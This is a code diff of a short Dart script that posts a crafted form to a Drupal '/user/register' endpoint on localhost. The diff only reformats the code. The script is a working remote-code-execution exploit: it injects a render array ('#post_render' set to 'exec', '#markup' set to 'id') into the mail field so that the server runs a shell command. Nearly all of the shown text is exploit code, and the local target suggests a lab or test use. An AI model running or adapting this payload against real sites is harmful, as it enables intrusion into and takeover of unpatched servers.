@@ -3,10 +3,13 @@ import 'package:http/http.dart' as http;
 
 Future<void> main() async {
   final base = 'http://localhost:8080';
-  final payload = 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=' +
+  final payload =
+      'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=' +
       Uri.encodeQueryComponent('id');
   final res = await http.post(
-    Uri.parse('$base/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'),
+    Uri.parse(
+      '$base/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
+    ),
     headers: {'Content-Type': 'application/x-www-form-urlencoded'},
     body: payload,
   );
